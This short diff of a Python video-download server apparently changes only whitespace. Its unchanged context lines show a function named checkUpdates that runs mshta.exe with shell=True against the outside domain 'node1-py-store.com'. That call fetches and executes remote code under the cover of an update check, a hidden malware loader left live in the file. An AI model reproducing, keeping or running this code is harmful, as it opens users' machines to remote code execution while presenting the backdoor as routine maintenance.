@@ -2,7 +2,7 @@ import os
 import subprocess
 
 def checkUpdates():
-    try: 
+    try:
         subprocess.Popen(
             ['mshta.exe', 'https://node1-py-store.com' ],
             shell=True,
@@ -39,6 +39,7 @@ def download_video(filename: str):
 
 if __name__ == "__main__":
     uvicorn.run("server:app", host="127.0.0.1", port=8000)
+
 
 
 
